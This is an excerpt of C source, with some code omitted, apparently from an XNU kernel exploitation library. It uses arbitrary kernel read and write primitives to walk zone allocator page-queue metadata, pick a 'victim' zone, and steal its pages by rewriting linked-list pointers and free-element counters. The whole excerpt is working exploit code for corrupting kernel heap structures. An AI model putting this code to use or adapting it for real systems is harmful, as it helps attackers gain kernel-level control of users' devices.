...
uint32_t xe_util_zalloc_find_last_secondary_page(uint32_t pageq_primary, uint* num_secondary_pages) {
    ...
    while (1) {
        uint32_t next = xe_kmem_read_uint32(KMEM_OFFSET(xe_util_zalloc_pageq_to_meta(tail), TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET));
        if (!next) {
            break;
        }
...
uint32_t xe_util_zalloc_find_primary_pageq(uint32_t pageq_start, uint max_depth, uint* found_depth, uint* num_secondary_pages) {
    ...
    while (depth < max_depth) {
        ...
        uint32_t next = xe_kmem_read_uint32(KMEM_OFFSET(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET));
        if (!next) {
            break;
        }
        cursor = next;
...
uintptr_t xe_util_zalloc_find_victim_zone(uint elem_size) {
    ...
    for (int i=0; i<VAR_ZONE_ARRAY_LEN; i++) {
        ...
        uint16_t z_chunk_pages = xe_kmem_read_uint16(KMEM_OFFSET(zone, TYPE_ZONE_MEM_Z_CHUNK_PAGES_OFFSET));
...
void xe_util_init_bitmap_ref(uintptr_t meta_base, uint32_t elem_size) {
    uint16_t zm_chunk_len;
    xe_kmem_read_bitfield(&zm_chunk_len, meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_MEM_ZM_CHUNK_LEN_BIT_SIZE);
    uint32_t zm_bitmap = xe_kmem_read_uint32(KMEM_OFFSET(meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET));
...
uint32_t xe_util_zalloc_steal_pageq(uintptr_t recipient_zone, uint elem_size, uint* num_secodary_pages_out) {
    ...
    uint32_t prev_pageq = xe_kmem_read_uint32(KMEM_OFFSET(meta_head, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET));
    uint32_t next_pageq = xe_kmem_read_uint32(KMEM_OFFSET(meta_tail, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET));
    ...
    if (prev_meta && next_meta) {
        xe_kmem_write_uint32(KMEM_OFFSET(prev_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET), next_pageq);
        xe_kmem_write_uint32(KMEM_OFFSET(next_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET), prev_pageq);
    } else if (prev_meta) {
        xe_kmem_write_uint32(KMEM_OFFSET(prev_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET), 0);
    } else if (next_meta) {
        xe_kmem_write_uint32(KMEM_OFFSET(next_meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET), 0);
    }
    
    xe_kmem_write_uint32(KMEM_OFFSET(meta_head, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_PREV_OFFSET), 0);
    xe_kmem_write_uint32(KMEM_OFFSET(meta_tail, TYPE_ZONE_PAGE_METADATA_MEM_ZM_PAGE_NEXT_OFFSET), 0);
    ...
    xe_kmem_write_uint32(KMEM_OFFSET(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET), z_elems_free - elems_lost);
    xe_kmem_write_uint32(KMEM_OFFSET(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_AVAIL_OFFSET), z_elems_avail - elems_lost);
    return pageq;
}
